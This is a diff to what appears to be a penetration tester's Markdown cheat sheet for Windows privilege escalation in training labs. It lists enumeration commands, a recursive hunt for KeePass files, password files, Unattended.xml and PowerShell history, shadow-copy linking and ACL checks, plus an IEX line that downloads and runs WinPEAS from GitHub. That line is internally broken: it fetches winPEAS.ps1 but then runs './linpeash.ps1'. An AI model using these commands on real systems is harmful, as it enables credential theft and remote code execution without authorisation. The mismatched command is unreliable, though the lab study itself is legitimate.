@@ -38,7 +38,7 @@ Alternative: `net user`
 ```powershell
 ipconfig /all; route print; netstat -ano; netsh advfirewall show currentprofile, netsh advfirewall firewall show rule name=all
 ```
-	
+
 ##### Interesting files
 ```powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -Include *password* -Include proof.txt -Include local.txt -Include sysprep.inf -Include Unattended.xml -File -Recurse -ErrorAction SilentlyContinue; Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue; Get-History; (Get-PSReadlineOption).HistorySavePath | cat - ; 
@@ -61,8 +61,7 @@ Shadow Copy: `vssadmin list shadows`, `mklink /d c:\shadowcopy \\?\GLOBALROOT\De
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
 ```
 	
-
-WinPEAS
+##### WinPEAS
 ```bash
 IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'); ./linpeash.ps1 -a -r | tee linpeas.txt
 ```
@@ -70,6 +69,11 @@ Read it with color-highlighting using `less -r linpeas.txt`
 
 > I still have to run WinPEAS once and check what additional commands I need to integrate from [[2_loot-privEsc_Windows_Manually]]
 
+##### Windows Exploit Suggester - Next Generation
+On target, execute `systeminfo > systeminfo.txt` and transfer file. On kali, do
+```bash
+wes --muc-lookup systeminfo.txt
+```
 
 Consider [[3_dllHijacking_guide]]
 
